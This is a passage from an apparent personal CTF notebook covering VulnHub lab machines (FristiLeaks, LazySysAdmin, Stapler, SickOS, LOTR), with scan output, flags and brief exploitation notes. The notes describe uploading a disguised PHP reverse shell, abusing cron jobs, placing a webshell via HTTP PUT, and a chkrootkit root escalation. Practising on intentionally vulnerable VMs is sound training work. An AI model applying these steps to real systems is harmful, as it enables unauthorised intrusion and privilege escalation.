OSVDB-3268: /scripts/: Directory indexing found.<br />+ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 58a38e5a14c97, mtime: gzip<br />+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS <br />+ OSVDB-3268: /help/: Directory indexing found.<br />+ /help/: Help directory should not be accessible<br />+ OSVDB-3268: /css/: Directory indexing found.<br />+ OSVDB-3092: /css/: This might be interesting...<br />+ OSVDB-3268: /development/: Directory indexing found.<br />+ OSVDB-3092: /development/: This might be interesting...<br />+ OSVDB-3268: /manual/: Directory indexing found.<br />+ OSVDB-3092: /manual/: Web server manual found.<br />+ OSVDB-3268: /images/: Directory indexing found.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ /debug/: Possible debug directory/program found.<br />+ 8727 requests: 0 error(s) and 18 item(s) reported on remote host<br />+ End Time:           2019-10-10 18:07:15 (GMT-4) (53 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested</div><div class='page'><h1 class='title level-5'>wpscan</h1><br/></div><div class='page'><h1 class='title level-6'>80</h1><br/></div><div class='page'><h1 class='title level-6'>8080</h1><br/></div><div class='page'><h1 class='title level-4'>flags</h1><br/>user.txt<br />404b9193154be7fbbc56d7534cb26339<br />root.txt<br />0d2c6222bfdd3701e0fa12a9a9dc9c8c</div><div class='page'><h1 class='title level-3'>FirstiLeaks</h1><br/>First I ran a nmap scan and it revealed that port 80 was open<br />Dirsearch and nikto both revealed nothing<br />after cheating I found that fristi was the login page (I was supposed to guess that)<br />In the source code of the page I found a base 64 encoded password<br />after putting it in cyber chef I realized it was still trash.<br />I then turned it into an image and BOOM creds.<br />eezeepz keKkeKKeKKeKkEkkEk<br />I was then able to upload a php reverse shell (pentestmonkey) named php-reverse-shell.php.png<br />start nc listener<br /><a href="http://192.168.11.139/fristi/uploads/php-reverse-shell.php.png">http://192.168.11.139/fristi/uploads/php-reverse-shell.php.png</a> and it was executed!<br />I was able to cd into /home/eezeepz and read notes.txt<br />It told me hat I could run files that started with /usr/bin/*<br />I could run things by echoing them into /tmp/runthis and it would be executed every minute<br />echo ‘/usr/bin/../../bin/chmod 777 /home/admin’ &gt; /tmp/runthis<br />now I can cd into /home/admin!<br />Here I saw a homemade script named cryptpass.py that would encrypt passwords.<br />(the encrypted password was in the same dir)<br />I wrote a decoder for the encoder and boom! fristigod creds!<br />su -l fristigod  and creds = we are now fristigod!!!!<br />sudo -l shows that we can run a cutom “doCom” as fristi (probably root)<br />sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom chmod -R 777 /root <br />BOOM /root is open and the flag is readable!!</div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>nmap -sC -sV -p- -oN FirstiLeaks.txt 192.168.11.139<br /><br />eezeepz<br />KeKkeKKeKKeKkEkkEk<br /><br />echo &#39;/usr/bin/../../bin/chmod 777 /home/admin&#39; &gt; /tmp/runthis</div><div class='page'><h1 class='title level-5'>nmap</h1><br/>root@kali:~/Desktop/Machines/VulnHub/FirstiLieaks# nmap -sC -sV -p- -oN FirstiLeaks.txt 192.168.11.139<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-14 16:48 EDT<br />Nmap scan report for 192.168.11.139<br />Host is up (0.00036s latency).<br />Not shown: 65534 filtered ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />| http-robots.txt: 3 disallowed entries <br />|_/cola /sisi /beer<br />|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3<br />|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).<br />MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 155.80 seconds<br /></div><div class='page'><h1 class='title level-5'>dirsearch</h1><br/>root@kali:~/Desktop/Machines/VulnHub/FirstiLieaks# nmap -sC -sV -p- -oN FirstiLeaks.txt 192.168.11.139<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-14 16:48 EDT<br />Nmap scan report for 192.168.11.139<br />Host is up (0.00036s latency).<br />Not shown: 65534 filtered ports<br />PORT   STATE SERVICE VERSION<br />80/tcp open  http    Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)<br />| http-methods: <br />|_  Potentially risky methods: TRACE<br />| http-robots.txt: 3 disallowed entries <br />|_/cola /sisi /beer<br />|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3<br />|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).<br />MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 155.80 seconds<br /></div><div class='page'><h1 class='title level-5'>nikto</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.139<br />+ Target Hostname:    192.168.11.139<br />+ Target Port:        80<br />+ Start Time:         2019-10-14 16:52:13 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3<br />+ Server may leak inodes via ETags, header found with file /, inode: 12722, size: 703, mtime: Tue Nov 17 13:45:47 2015<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ Entry &#39;/cola/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/sisi/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ Entry &#39;/beer/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ &quot;robots.txt&quot; contains 3 entries which should be manually viewed.<br />+ Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ PHP/5.3.3 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.<br />+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE <br />+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST<br />+ OSVDB-3268: /icons/: Directory indexing found.<br />+ OSVDB-3268: /images/: Directory indexing found.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ 8727 requests: 0 error(s) and 15 item(s) reported on remote host<br />+ End Time:           2019-10-14 16:52:29 (GMT-4) (16 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-5'>notes.txt</h1><br/>cat notes.txt<br />Yo EZ,<br /><br />I made it possible for you to do some automated checks, <br />but I did only allow you access to /usr/bin/* system binaries. I did<br />however copy a few extra often needed commands to my <br />homedir: chmod, df, cat, echo, ps, grep, egrep so you can use those<br />from /home/admin/<br /><br />Don&#39;t forget to specify the full path for each binary!<br /><br />Just put a file called &quot;runthis&quot; in /tmp/, each line one command. The <br />output goes to the file &quot;cronresult&quot; in /tmp/. It should <br />run every minute with my account privileges.<br /><br />- Jerry<br /></div><div class='page'><h1 class='title level-5'>decoder.py</h1><br/>import base64,codecs,sys<br /><br />def encodeString(str):<br />        base64string=   base64.b64encode(str)<br />        return codecs.encode(base64string[::-1], &#39;rot13&#39;)<br /><br />def decodestring(str):<br />        str     = str [::-1]<br />        string  = str.encode(&quot;rot13&quot;)<br />        return base64.b64decode(string)<br />print decodestring(&quot;=RFn0AKnlMHMPIzpyuTI0ITG&quot;)<br /><br /><br /><br /><br /><br />root@kali:~/Desktop/Machines/VulnHub/Fristileaks# python decoder.py <br />LetThereBeFristi!<br /></div><div class='page'><h1 class='title level-4'>flag</h1><br/>cat fristileaks_secrets.txt<br />Congratulations on beating FristiLeaks 1.0 by Ar0xA [<a href="https://tldr.nu]">https://tldr.nu]</a><br /><br />I wonder if you beat it in the maximum 4 hours it&#39;s supposed to take!<br /><br />Shoutout to people of #fristileaks (twitter) and #vulnhub (FreeNode)<br /><br /><br />Flag: Y0u_kn0w_y0u_l0ve_fr1st1<br /><br /><br />bash-4.1$ <br /></div><div class='page'><h1 class='title level-3'>Lazysysadmin</h1><br/></div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>nmap -sC -sV -p- -oN Lazy.txt 192.168.11.140<br /><br /><code>nmap -v -sV -p- --script vuln -T4 1</code>92.168.11.140<br /><br />smbmap -H 192.168.11.140 -P 139 -R <br /><code>    smbclient &#39;\\server\share&#39;<br />    mask &quot;&quot;<br />    recurse ON<br />    prompt OFF<br />    cd &#39;path\to\remote\dir&#39;<br />    lcd &#39;~/path/to/download/to/&#39;<br />    mget *</code></div><div class='page'><h1 class='title level-5'>nmap</h1><br/>root@kali:~/Desktop/Machines/VulnHub/Lazysysadmin# nmap -sC -sV -p- -oN Lazy.txt 192.168.11.140<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-16 13:54 EDT<br />Nmap scan report for 192.168.11.140<br />Host is up (0.0026s latency).<br />Not shown: 65529 closed ports<br />PORT     STATE SERVICE     VERSION<br />22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   1024 b5:38:66:0f:a1:ee:cd:41:69:3b:82:cf:ad:a1:f7:13 (DSA)<br />|   2048 58:5a:63:69:d0:da:dd:51:cc:c1:6e:00:fd:7e:61:d0 (RSA)<br />|   256 61:30:f3:55:1a:0d:de:c8:6a:59:5b:c9:9c:b4:92:04 (ECDSA)<br />|_  256 1f:65:c0:dd:15:e6:e4:21:f2:c1:9b:a3:b6:55:a0:45 (ED25519)<br />80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))<br />|_http-generator: Silex v2.2.7<br />| http-robots.txt: 4 disallowed entries <br />|_/old/ /test/ /TR2/ /Backnode_files/<br />|_http-server-header: Apache/2.4.7 (Ubuntu)<br />|_http-title: Backnode<br />139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br />445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br />3306/tcp open  mysql       MySQL (unauthorized)<br />6667/tcp open  irc         InspIRCd<br />| irc-info: <br />|   server: Admin.local<br />|   users: 1<br />|   servers: 1<br />|   chans: 0<br />|   lusers: 1<br />|   lservers: 0<br />|   source ident: nmap<br />|   source host: 192.168.11.136<br />|_  error: Closing link: (nmap@192.168.11.136) [Client exited]<br />MAC Address: 00:0C:29:76:F8:AB (VMware)<br />Service Info: Hosts: LAZYSYSADMIN, Admin.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Host script results:<br />|_clock-skew: mean: -3h25m17s, deviation: 5h46m24s, median: -5m17s<br />|_nbstat: NetBIOS name: LAZYSYSADMIN, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)<br />| smb-os-discovery: <br />|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br />|   Computer name: lazysysadmin<br />|   NetBIOS computer name: LAZYSYSADMIN\x00<br />|   Domain name: \x00<br />|   FQDN: lazysysadmin<br />|_  System time: 2019-10-17T03:49:23+10:00<br />| smb-security-mode: <br />|   account_used: guest<br />|   authentication_level: user<br />|   challenge_response: supported<br />|_  message_signing: disabled (dangerous, but default)<br />| smb2-security-mode: <br />|   2.02: <br />|_    Message signing enabled but not required<br />| smb2-time: <br />|   date: 2019-10-16 13:49:23<br />|_  start_date: N/A<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 28.10 seconds<br /></div><div class='page'><h1 class='title level-5'>dirsearch</h1><br/> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-16_13-56-32.log<br /><br />Target: http://192.168.11.140:80<br /><br />[13:56:32] Starting: <br />[13:56:32] 403 -  285B  - /.php      <br />[13:56:32] 403 -  287B  - /icons/      <br />[13:56:32] 200 -   77KB - /info.php    <br />[13:56:34] 200 -  738B  - /test/                <br />[13:56:34] 200 -   12KB - /wordpress/       <br />[13:56:34] 200 -  734B  - /wp/           <br />[13:56:34] 200 -  742B  - /apache/         <br />[13:56:35] 200 -  736B  - /old/              <br />[13:56:35] 403 -  292B  - /javascript/  <br />[13:56:57] 200 -    8KB - /phpmyadmin/                <br />[14:00:29] 403 -  295B  - /server-status/                                    <br />                                                                <br />Task Completed<br /></div><div class='page'><h1 class='title level-5'>nikto</h1><br/>- Nikto v2.1.6<br />---------------------------------------------------------------------------<br />+ Target IP:          192.168.11.140<br />+ Target Hostname:    192.168.11.140<br />+ Target Port:        80<br />+ Start Time:         2019-10-16 13:56:31 (GMT-4)<br />---------------------------------------------------------------------------<br />+ Server: Apache/2.4.7 (Ubuntu)<br />+ The anti-clickjacking X-Frame-Options header is not present.<br />+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS<br />+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type<br />+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)<br />+ OSVDB-3268: /old/: Directory indexing found.<br />+ Entry &#39;/old/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ OSVDB-3268: /test/: Directory indexing found.<br />+ Entry &#39;/test/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ OSVDB-3268: /Backnode_files/: Directory indexing found.<br />+ Entry &#39;/Backnode_files/&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200)<br />+ &quot;robots.txt&quot; contains 4 entries which should be manually viewed.<br />+ Server may leak inodes via ETags, header found with file /, inode: 8ce8, size: 5560ea23d23c0, mtime: gzip<br />+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.<br />+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS <br />+ OSVDB-3268: /apache/: Directory indexing found.<br />+ OSVDB-3092: /apache/: This might be interesting...<br />+ OSVDB-3092: /old/: This might be interesting...<br />+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.22<br />+ Uncommon header &#39;x-ob_mode&#39; found, with contents: 0<br />+ OSVDB-3092: /test/: This might be interesting...<br />+ /info.php: Output from the phpinfo() function was found.<br />+ OSVDB-3233: /info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.<br />+ OSVDB-3233: /icons/README: Apache default file found.<br />+ OSVDB-5292: /info.php?file=http://cirt.net/rfiinc.txt?: RFI from RSnake&#39;s list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/<br />+ /phpmyadmin/: phpMyAdmin directory found<br />+ 8071 requests: 0 error(s) and 24 item(s) reported on remote host<br />+ End Time:           2019-10-16 13:57:27 (GMT-4) (56 seconds)<br />---------------------------------------------------------------------------<br />+ 1 host(s) tested<br /></div><div class='page'><h1 class='title level-4'>flags</h1><br/>root@LazySysAdmin:/root# cat proof.txt <br />WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851<br /><br /><br />Well done :)<br /><br />Hope you learn&#39;t a few things along the way.<br /><br />Regards,<br /><br />Togie Mcdogie<br /><br /><br /><br /><br />Enjoy some random strings<br /><br />WX6k7NJtA8gfk*w5J3&amp;T@*Ga6!0o5UP89hMVEQ#PT9851<br />2d2v#X6x9%D6!DDf4xC1ds6YdOEjug3otDmc1$#slTET7<br />pf%&amp;1nRpaj^68ZeV2St9GkdoDkj48Fl$MI97Zt2nebt02<br />bhO!5Je65B6Z0bhZhQ3W64wL65wonnQ$@yw%Zhy0U19pu<br /></div><div class='page'><h1 class='title level-3'>Stapler</h1><br/></div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>nmap -sC -sV -p- -oN Nmap.txt 192.168.11.210                                                               &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<br /></div><div class='page'><h1 class='title level-5'>nmap</h1><br/>root@kali:~/Desktop/Machines/VulnHub# nmap -sC -sV -p- -oN Nmap.txt 192.168.11.210<br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-16 16:51 EDT<br />Nmap scan report for 192.168.11.210<br />Host is up (0.00032s latency).<br />Not shown: 65523 filtered ports<br />PORT      STATE  SERVICE     VERSION<br />20/tcp    closed ftp-data<br />21/tcp    open   ftp         vsftpd (Misconfigured)<br />22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)<br />|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)<br />|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)<br />53/tcp    open   domain      dnsmasq 2.75<br />| dns-nsid: <br />|_  bind.version: dnsmasq-2.75<br />80/tcp    closed http<br />123/tcp   closed ntp<br />137/tcp   closed netbios-ns<br />138/tcp   closed netbios-dgm<br />139/tcp   open   tcpwrapped<br />666/tcp   open   doom?<br />| fingerprint-strings: <br />|   NULL: <br />|     message2.jpgUT <br />|     QWux<br />|     &quot;DL[E<br />|     #;3[<br />|     \xf6<br />|     u([r<br />|     qYQq<br />|     Y_?n2<br />|     3&amp;M~{<br />|     9-a)T<br />|     L}AJ<br />|_    .npy.9<br />3306/tcp  closed mysql<br />12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))<br />|_http-server-header: Apache/2.4.18 (Ubuntu)<br />|_http-title: Tim, we need to-do better next year for Initech<br />1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at <a href="https://nmap.org/cgi-bin/submit.cgi?new-service">https://nmap.org/cgi-bin/submit.cgi?new-service</a> :<br />SF-Port666-TCP:V=7.70%I=7%D=10/16%Time=5DA78347%P=i686-pc-linux-gnu%r(NULL<br />SF:,2D58,&quot;PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x15<br />SF:2\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x04<br />SF:\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa2<br />SF:\x20\x19\xabUT\xc4T\x11\xa9\x102&gt;\x8a\xd4RDK\x15\x85Jj\xa9\&quot;DL\[E\xa2\x<br />SF:0c\x19\x140&lt;\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\xb<br />SF:2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu\<br />SF:xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd3<br />SF:\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82&gt;`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa0<br />SF:\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x8<br />SF:7\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\xf<br />SF:4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\xd<br />SF:c\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd5<br />SF:\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xaf<br />SF:\xbd&amp;&amp;q\xf9\x97&#39;i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:\<br />SF:xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\x<br />SF:8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&amp;\xb9N\x9e&lt;\xb1\\\.\xb9\xcc\x<br />SF:e7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd\<br />SF:xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x&#39;\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\x<br />SF:9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\x<br />SF:f1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\x<br />SF:f8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak\<br />SF:xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\x<br />SF:d2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f\<br />SF:xf9\xea\xb5m\x1c\xfc\xfef\&quot;\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\[<br />SF:\x93&amp;\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&amp;M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\xc<br />SF:c\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa7<br />SF:\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\x<br />SF:fd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x96<br />SF:\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb&lt;C\xcap\x8f\<br />SF:xd0\x8f\x9fu\x01\x8dvT\xf0&#39;\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&amp;\xf4\<br />SF:xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\x<br />SF:88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xbc<br />SF:L}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0\<br />SF:.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\x<br />SF:f6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\xf<br />SF:3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\?<br />SF:\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0&quot;);<br />MAC Address: 00:0C:29:0F:20:51 (VMware)<br />Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Host script results:<br />|_smb2-security-mode: SMB: Couldn&#39;t find a NetBIOS name that works for the server. Sorry!<br />|_smb2-time: ERROR: Script execution failed (use -d to debug)<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 147.21 seconds<br /></div><div class='page'><h1 class='title level-3'>SickOS</h1><br/>ran nmap scan and saw that 22 and 80<br />dirsearch found dir /test/<br />when opening in burp I ran the OPTIONS argument against /test/ and saw I could PUT!<br />put the 3 line php webshell in and executed it by going to dir and running whoami <br />success!!<br />with the webshell I tried to wget over 3232, 80, 8080,888 and 443 from the url to a kalihosted simplehttpserver<br />now i put my big php script in there calling back over 443 and executed it<br />Shell!!<br />from here I ran the inital enum commands...<br />nothing<br />lse.sh         nothing is popping out<br />les.sh          yeet cannon! <br />the machine has a vulnerable chkrootkit and it is in the daily cronjob<br />made a bash script that would chmod -R 777 /root<br />the cron job runs every minute, and I am now root!!<br /><br /><br /><br /><br /><br /></div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>nmap -sC -sV -p- -oN Nmap.txt 192.168.11.250   </div><div class='page'><h1 class='title level-5'>nmap</h1><br/>root@kali:~# nmap -sC -sV -p- -oN Nmap.txt 192.168.11.250   <br />Starting Nmap 7.70 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2019-10-16 17:51 EDT<br />Nmap scan report for 192.168.11.250<br />Host is up (0.00039s latency).<br />Not shown: 65533 filtered ports<br />PORT   STATE SERVICE VERSION<br />22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)<br />|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)<br />|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)<br />80/tcp open  http    lighttpd 1.4.28<br />|_http-server-header: lighttpd/1.4.28<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />MAC Address: 00:0C:29:FC:64:BB (VMware)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br />Nmap done: 1 IP address (1 host up) scanned in 110.87 seconds<br /></div><div class='page'><h1 class='title level-5'>nikto</h1><br/></div><div class='page'><h1 class='title level-5'>dirsearch</h1><br/> _|. _ _  _  _  _ _|_    v0.3.8<br />(_||| _) (/_(_|| (_| )<br /><br />Extensions: php | HTTP method: get | Threads: 20 | Wordlist size: 441041<br /><br />Error Log: /root/Desktop/Tools/dirsearch/logs/errors-19-10-16_17-55-20.log<br /><br />Target: http://192.168.11.250:80<br /><br />[17:55:20] Starting: <br />[17:55:21] 200 -  163B  - /index.php  <br />[17:55:22] 200 -    1KB - /test/                <br />                                                                <br />Task Completed<br />root@kali:~/Desktop/Tools/TireFire# <br /><br /></div><div class='page'><h1 class='title level-5'>put</h1><br/>curl -v -X OPTIONS http://192.168.11.250:80/</div><div class='page'><h1 class='title level-4'>flag</h1><br/>www-data@ubuntu:/root$ cat 7d03aaa2bf93d80040f3f22ec6ad9d5a.txt <br />WoW! If you are viewing this, You have &quot;Sucessfully!!&quot; completed SickOs1.2, the challenge is more focused on elimination of tool in real scenarios where tools can be blocked during an assesment and thereby fooling tester(s), gathering more information about the target using different methods, though while developing many of the tools were limited/completely blocked, to get a feel of Old School and testing it manually.<br /><br />Thanks for giving this try.<br /><br />@vulnhub: Thanks for hosting this UP!.<br /></div><div class='page'><h1 class='title level-3'>LOTR</h1><br/></div><div class='page'><h1 class='title level-4'>enumeration</h1><br/>nmap -sC -sV -p- -oN Nmap.txt 192.168.11.252</div><div class='page'><h1 class='title level-5'>nmap</h1><br/>root@kali:~/Desktop/Machines/VulnHub/LOTR# nmap -sC -sV -p-  192.168.11.252<br />Starting Nmap 7.70 ( https://nmap.org ) at 2019-10-18 15:16 EDT<br />Nmap scan report for 192.168.11.252<br />Host is up (0.00046s latency).<br />Not shown: 65533 filtered ports<br />PORT     STATE SERVICE VERSION<br />22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)<br />|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)<br />|   256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)<br />|_  256 34:ec:16:dd:a7:cf:2a:86:45:ec:65:ea:05:43:89:21 (ED25519)<br />1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))<br />|_http-server-header: Apache/2.4.7 (Ubuntu)<br />|_http-title: Site doesn&#39;t have a title (text/html).<br />MAC Address: 00:0C:29:C4:1B:78 (VMware)<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br />Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />Nmap done: 1 IP address (1 host up) scanned in 116.58 seconds<br /></div><div class='page'><h1 